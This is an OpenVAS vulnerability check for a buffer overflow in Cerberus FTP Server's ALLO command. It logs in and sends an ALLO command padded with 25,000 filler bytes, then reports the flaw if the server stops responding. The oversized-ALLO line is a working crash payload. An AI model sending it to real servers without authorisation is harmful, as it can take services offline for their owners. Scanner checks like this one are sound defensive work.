###############################################################################
# OpenVAS Vulnerability Test
# $Id: cerberus_ftp_36134.nasl 13475 2019-02-05 14:51:19Z cfischer $
#
# Cerberus FTP Server 'ALLO' Command Buffer Overflow Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100260");
  script_version("$Revision: 13475 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-05 15:51:19 +0100 (Tue, 05 Feb 2019) $");
  script_tag(name:"creation_date", value:"2009-08-26 11:37:11 +0200 (Wed, 26 Aug 2009)");
  script_bugtraq_id(36134);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Cerberus FTP Server 'ALLO' Command Buffer Overflow Vulnerability");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/36134");
  script_xref(name:"URL", value:"http://www.cerberusftp.com/index.html");
  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_family("FTP");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/cerberus/detected");

  script_tag(name:"summary", value:"Cerberus FTP Server is prone to a buffer-overflow vulnerability.");

  script_tag(name:"impact", value:"A successful exploit may allow attackers to execute arbitrary code in
  the context of the vulnerable service. Failed exploit attempts will likely cause denial-of-service conditions.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("ftp_func.inc");

ftpPort = get_ftp_port(default:21);
banner = get_ftp_banner(port:ftpPort);
if(! banner || "Cerberus FTP" >!< banner)
  exit(0);

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

for(i = 0; i < 2; i++ ) {

  soc1 = open_sock_tcp(ftpPort);
  if(!soc1) exit(0);

  login_details = ftp_log_in(socket:soc1, user:user, pass:pass);
  if(login_details) {
    ftpPort2 = ftp_get_pasv_port(socket:soc1);
    soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
    if(soc2) {
      crapData = string("ALLO ", crap(length: 25000),"\r\n");
      send(socket:soc1, data: crapData);
      close(soc2);
    }
  }
  close(soc1);
}

sleep(5);

soc3 = open_sock_tcp(ftpPort);

if(!ftp_recv_line(socket:soc3)) {
  security_message(port:ftpPort);
  close(soc3);
  exit(0);
}

exit(0);